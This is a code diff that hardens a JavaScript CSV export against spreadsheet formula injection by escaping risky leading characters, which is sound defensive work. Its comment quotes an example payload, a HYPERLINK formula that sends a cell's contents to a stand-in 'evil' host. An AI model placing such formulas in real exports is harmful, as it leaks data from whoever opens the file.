@@ -780,9 +780,27 @@ ${paletteToCss(loadBrandSync(), 'light')}
 
 /* ---------------- CSV Export ---------------- */
 
-function csvEscape(value) {
-  const s = String(value ?? '');
-  if (/[",\n]/.test(s)) {
+/**
+ * Escape one CSV cell.
+ *
+ * Two separate jobs, and the second one used to be missing:
+ *
+ *   1. CSV syntax — a value containing a quote, comma or newline must be
+ *      wrapped and its own quotes doubled.
+ *   2. Spreadsheet formula injection (OWASP CSV Injection) — Excel, Google
+ *      Sheets and LibreOffice evaluate a cell that *starts* with `=`, `+`, `-`,
+ *      `@`, TAB or CR. Customer names, product names, notes and feedback text
+ *      are all user data, so a name of `=HYPERLINK("http://evil/"&A1,"x")`
+ *      would execute on whoever opens the export. Prefixing an apostrophe
+ *      forces the cell to be read as text.
+ *
+ * Exported (rather than module-private) so `scripts/test-csv.js` can assert the
+ * behaviour without a browser.
+ */
+export function csvEscape(value) {
+  let s = String(value ?? '');
+  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
+  if (/[",\n\r]/.test(s)) {
     return '"' + s.replace(/"/g, '""') + '"';
   }
   return s;
